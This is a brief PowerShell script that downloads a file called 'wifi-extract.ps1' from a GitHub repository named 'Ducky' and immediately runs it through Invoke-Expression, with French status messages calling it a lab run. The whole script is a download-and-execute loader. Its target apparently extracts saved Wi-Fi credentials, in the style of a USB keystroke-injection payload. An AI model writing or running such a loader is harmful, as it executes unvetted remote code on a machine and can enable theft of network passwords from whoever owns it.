param(
    [string]$Url = 'https://raw.githubusercontent.com/BL4CK-SUN/Ducky/main/wifi-extract.ps1'
)

Write-Host "GET $Url"
try {
    $raw = (Invoke-WebRequest -Uri $Url -UseBasicParsing).Content
    if ($raw.Length -ge 3 -and [int][char]$raw[0] -eq 0xFEFF) { $raw = $raw.Substring(1) }
    elseif ($raw.StartsWith([char]0xFEFF)) { $raw = $raw.TrimStart([char]0xFEFF) }
    Write-Host "OK ($($raw.Length) chars). Exécution lab..."
    Invoke-Expression $raw
} catch {
    Write-Error $_
    Write-Host "Si 404 : repo vide, mauvaise branche, ou repo privé sans auth."
    exit 1
}